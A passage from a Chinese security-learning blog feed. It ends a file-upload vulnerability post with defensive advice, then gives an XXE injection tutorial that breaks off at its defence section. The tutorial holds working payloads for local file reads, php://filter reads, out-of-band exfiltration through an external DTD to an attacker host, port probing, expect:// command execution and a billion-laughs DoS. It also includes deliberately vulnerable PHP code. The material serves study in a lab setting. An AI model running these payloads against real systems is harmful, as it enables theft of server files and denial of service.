href="http://www.example.com/hacker.jsp%EF%BC%8C%E8%AE%BF%E9%97%AE%E8%AF%A5%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%8F%96%E5%BE%97WebShell%EF%BC%8C%E7%BB%93%E6%9D%9F%E6%A3%80%E6%B5%8B%E3%80%82">http://www.example.com/hacker.jsp，访问该后门程序，取得WebShell，结束检测。</a></li></ol><h1 id="上传漏洞防御"><a href="#上传漏洞防御" class="headerlink" title="上传漏洞防御"></a>上传漏洞防御</h1><ol><li>文件上传的目录设置为不可执行<br>最有效的，将文件上传目录直接设置为不可执行，对于Linux而言，撤销其目录的’x’权限；实际中很多大型网站的上传应用都会放置在独立的存储上作为静态文件处理，一是方便使用缓存加速降低能耗，二是杜绝了脚本执行的可能性。</li><li>判断文件类型<br>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</li><li>使用随机数改写文件名和文件路径<br>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</li><li>单独设置文件服务器的域名<br>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/weixin_39190897/article/details/85334893">Web安全-文件上传漏洞与WAF绕过</a></p><p>[2] <a href="https://blog.csdn.net/weixin_44677409/article/details/92799366">upload-labs通关记录</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞学习</title>
      <link href="posts/19226.html"/>
      <url>posts/19226.html</url>
      
        <content type="html"><![CDATA[<h1 id="XXE简介"><a href="#XXE简介" class="headerlink" title="XXE简介"></a>XXE简介</h1><p>XXE （XML EXternal Entity）即XML外部实体注入攻击，是一种常见的Web安全漏洞，发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致攻击者可以通过XML的外部实体获取服务器中本应被保护的数据。如当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><p>学习XXE，先来了解一下XML。</p><p>XML是一种用于标记电子文件使其具有结构性的可扩展标记语言(Extensible Markup Language） </p><p>XML是一种非常灵活的语言，类似于HTML语言，但是并没有固定的标签。所有的标签都可以自定义，其设计的宗旨是传输和存储数据，而不是像HTML一样显示数据。</p><p>XML不会做任何事情，它是被设计用来结构化、存储以及传输信息，也就是XML文件所携带的信息，需要被其他的语言或者程序来解析，才能发挥作用。</p><h2 id="XML解析"><a href="#XML解析" class="headerlink" title="XML解析"></a>XML解析</h2><p>流程图</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/U329ff4f7d6a14d788b5e54a8f7ec05e3z.jpg" alt="图片"></p><ol><li>程序(Application)接收到用户传递过来的数据，然后将其交给XML Generator(XML生成器)。</li><li>XML Generator(XML生成器)在接收到程序传递过来的数据后,会将这些数据进行一个规范化，最终生成XML数据。</li><li>XML Generator(XML生成器)在生成XML数据后，然后会由我们的HTTP客户端(HTTP Client)将其(XML数据)通过HTTP协议传递给服务端(Web Server)。</li><li>Web Server在接收到XML数据后则会将其交给XML Parser(XML解析器)。</li><li>XML解析器则会对接收到的XML数据进行一个解析处理,然后将信息返回给程序(Application)，最终呈现给用户。</li></ol><h2 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(1) XML 文档必须有一个根元素</span><br><span class="line">解释:就是说在XML文档中必须有一个元素是其他元素的父元素(也就是说其他元素必须包含在这个根元素下).根元素与其他元素的关系:父子关系.</span><br><span class="line"></span><br><span class="line">(2) XML 元素都必须有一个关闭标签</span><br><span class="line">解释:也就是说XML元素必须有头有尾,一对一对的出现.</span><br><span class="line"></span><br><span class="line">(3) XML 标签对大小敏感</span><br><span class="line">解释:XML标签的开始标签和闭合标签必须大小写一致.(不能一个大写一个小写)</span><br><span class="line">如:&lt;abc&gt;&lt;&#x2F;Abc&gt;       &#x2F;&#x2F;&#x2F;这样就是错误的!</span><br><span class="line"></span><br><span class="line">(4) XML 元素必须被正确的嵌套</span><br><span class="line">解释:XML元素在嵌套使用的时候,必须是一对一对的嵌套,不能只嵌套一个结束标签或一个开始标签.</span><br><span class="line">如:&lt;abc&gt;&lt;test&gt;&lt;&#x2F;abc&gt;&lt;&#x2F;test&gt;       &#x2F;&#x2F;这样就是错误的</span><br><span class="line">&lt;abc&gt;&lt;test&gt;&lt;&#x2F;test&gt;&lt;&#x2F;abc&gt;          &#x2F;&#x2F;正确的嵌套</span><br><span class="line"></span><br><span class="line">(5) XML 属性值必须加引号</span><br><span class="line">解释:XML元素在设置了属性后,其属性值必须用引号包裹.</span><br><span class="line">如:&lt;abc color&#x3D;blue&gt;               &#x2F;&#x2F;这样是错误的</span><br></pre></td></tr></table></figure><h2 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h2><p>XML结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210407213410158.png" alt="image-20210407213410158"></p><p>XML声明告诉浏览器这是一个XML文档。version属性是必须的，enconding属性说明文档的字符集编码。</p><p>我们可以把DTD理解为一个模板，这个模板里面定义了用户自己创建的根元素以及对应的子元素。而”文档元素”则必须以我们的DTD为模板，来对XML的元素的内容进行相应的规范化。</p><p><strong>PCDATA</strong> 的意思是被解析的字符数据（parsed character data），是会被解析器解析的文本，这些文本将被解析器检查实体以及标记。</p><p><strong>CDATA</strong> 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。在 XML 元素中，”&lt;” （新元素的开始）和 “&amp;” （字符实体的开始）是非法的。而某些文本，比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。CDATA 部分中的所有内容都会被解析器忽略。</p><p>示例：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210408221117818.png" alt="image-20210408221117818"></p><h2 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h2><p>除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)。实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><blockquote><p>用户可自定义的实体可以分为一般实体和参数实体</p><ol><li><p>一般实体的声明语法：<!ENTITY 实体名 "实体内容"><br>引用实体的方式：&amp;实体名；</p></li><li><p>参数实体<strong>只能在DTD中使用</strong>，参数实体的声明格式： <!ENTITY % 实体名 "实体内容"><br>引用实体的方式：%实体名;</p></li></ol></blockquote><p>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-string">&quot;hello,world&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">&lt;!--参数实体--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">test</span> <span class="meta-string">&quot;&lt;!ENTITY hello &#x27;hello,world&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%test;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;hello;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>实体从引入方式来看还可以分为两种，外部实体和内部实体。</p><ol><li>外部实体定义需要加上 SYSTEM关键字，其内容是URL所指向的外部文件实际的内容。</li><li>如果不加SYSTEM关键字，则为内部实体，表示实体指代内容为字符串。</li></ol></blockquote><p>上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用。</p><p>测试代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///D:/test.dtd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p>外部实体<code>&amp;xxe;</code>表示的就是引入的<code>test.dtd</code>中的内容。</p><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p><p>引入外部实体可用的相关协议：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210112223950560.png"></p><p>既然它能按照路径引入外部的 <code>dtd </code>文件，那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span> = &lt;&lt;&lt;EOF</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///C:/windows/system.ini&quot;</span>&gt; ]&gt; </span><br><span class="line">&lt;test&gt;&amp;xxe;&lt;/test&gt;</span><br><span class="line">EOF;</span><br><span class="line"><span class="variable">$data</span> = simplexml_load_string(<span class="variable">$xml</span>,SimpleXMLElement,LIBXML_NOENT);</span><br><span class="line">print_r(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果如图：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210408000828498.png" alt="image-20210408000828498"></p><p>假如 SYSTEM 后面的内容可以被用户控制，那么用户就可以随意替换为其他内容，从而读取服务器本地文件（file:///etc/passwd)或者远程文件（<a href="http://www.baidu.com/abc.txt%EF%BC%89">http://www.baidu.com/abc.txt）</a></p><h1 id="XXE发现"><a href="#XXE发现" class="headerlink" title="XXE发现"></a>XXE发现</h1><ol><li><p>首先寻找接受XML作为输入内容的注入点。</p><p>可以通过修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的xml内容，如果解析了, 那么则可能有XXE攻击漏洞。</p><p>还可以尝试注入xml预定义的一些实体,看其是否报错，通过报错信息判断。</p></li><li><p>如果站点解析xml，就可以尝试引用实体和DTD 。</p></li><li><p>如果可以引用外部实体,则存在xxe漏洞</p></li></ol><h1 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><ol><li>有回显的情况可以直接在页面中看到Payload的执行结果或现象(带内XML外部实体(XXE),即攻击者可以发送带有XXE有效负载的请求并从包含某些数据的Web应用程序获取响应)</li></ol><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;xxe&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;./xml.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = simplexml_load_string(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line"><span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>读取本地文件</strong></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/windows/system.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411175855619.png" alt="image-20210411175855619"></p><p>但是，当所读取文件中包含了<code>&lt;</code>或者<code>&amp;</code>等一些特殊符号时，会发现爆了一堆错而且读取不到该文件的内容。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411180142451.png" alt="image-20210411180142451"></p><p>原因是xml会把<code>&lt;</code>等特殊字符解析导致错误，那我们可以使用之前的<code>CDATA</code> 和参数实体来绕过。</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///D:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.77.1/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xxe.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>回显：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411221956406.png" alt="image-20210411221956406"></p><p>此外，针对读取文件中含特殊字符的情况并且该网站是php语言编写的，那我们可以使用php的一些伪协议进行读取。</p><p>用到的伪协议：</p><blockquote><p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p></blockquote><p>实际利用：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=D:/test.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411222122278.png" alt="image-20210411222122278"></p><p>base64解码后得到test.txt中的内容</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411222200953.png" alt="image-20210411222200953"></p><ol start="2"><li>在实际情况中，大多数情况下服务器上的XML并不是输出用的，所以就少了输出这一环节，这样的话，即使漏洞存在，我们的payload的也被解析了，但是由于没有输出，我们也不知道解析得到的内容是什么，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带数据。</li></ol><p>途径：通过外部DTD的方式可以将内部参数实体的内容与外部DTD声明的实体的内容拼接起来。<br>利用payload来从目标主机读取到文件内容后，将文件内容作为url的一部分来请求我们本地监听的端口。</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.232.128/a.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>a.dtd文件内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.232.128&#x2F;?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>查看服务器日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail /var/<span class="built_in">log</span>/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411235840135.png" alt="image-20210411235840135"></p><p>同样，base64解码得test.txt的内容</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411235716386.png" alt="image-20210411235716386"></p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>因为我们的XML在引用外部DTD和外部实体的时候支持http协议，我们可以利用这个特点进行端口探测。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//禁用/启用加载外部实体的功能</span></span><br><span class="line">    libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$creds</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.77.1:80&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，如果是请求开放的端口，请求时间较短。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210413223616203.png" alt="image-20210413223616203"></p><p>而如果请求的是未开放的端口，则请求时间明显加长!</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210413223716363.png" alt="image-20210413223716363"></p><p>进一步可利用burpsuite的爆破模块(Intruder)对所在网段进行端口探测。</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>当目标机器安装并加载了PHP的expect扩展,可以执行系统命令.(由于这个扩展不是默认安装的,所以很少碰到!)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [ <span class="meta">&lt;!ELEMENT  <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h2><p>在实验的过程中发现,单独一个数据包并不明显,可以结合burpsuite的爆破模块使用!(实际测试切记不要尝试)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">     <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol</span> <span class="meta-string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol2</span> <span class="meta-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol3</span> <span class="meta-string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol4</span> <span class="meta-string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol5</span> <span class="meta-string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol6</span> <span class="meta-string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol7</span> <span class="meta-string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol8</span> <span class="meta-string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol9</span> <span class="meta-string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="XXE防御"><a href="#XXE防御" class="headerlink" 